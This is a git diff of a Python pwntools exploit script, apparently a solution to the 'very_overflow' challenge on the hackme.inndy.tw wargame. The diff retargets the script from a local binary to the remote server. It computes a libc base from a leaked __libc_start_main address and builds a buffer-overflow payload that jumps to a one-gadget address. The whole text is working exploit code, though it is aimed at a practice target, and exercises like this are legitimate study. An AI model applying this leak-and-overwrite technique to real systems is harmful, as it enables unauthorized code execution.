@@ -18,9 +18,9 @@ def base_addr(prog_addr,offset):
 
 elf = ELF('/home/h11p/hackme/very_overflow')
 
-io = process('/home/h11p/hackme/very_overflow')
+#io = process('/home/h11p/hackme/very_overflow')
 
-#io = remote('hackme.inndy.tw', 7705)
+io = remote('hackme.inndy.tw', 7705)
 
 
 
@@ -43,9 +43,9 @@ io.recv()
 io.sendline("2")
 libc_start_main = io.recv().splitlines()[1]
 libc_module=base_addr(libc_start_main[11:],0x18637)
-MAGIC_addr=libc_module+localMAGIC
-#MAGIC_addr=libc_module+remoteMAGIC
-print hex(MAGIC_addr)
+#MAGIC_addr=libc_module+localMAGIC
+MAGIC_addr=libc_module+remoteMAGIC
+print "MAGIC_addr:"+hex(MAGIC_addr)
 io.sendline('133')
 io.recvuntil('Your new data:')
 payload = 'a'*10+'b'*7+p32(MAGIC_addr)+'c'*9+'d'*10+'e'*7
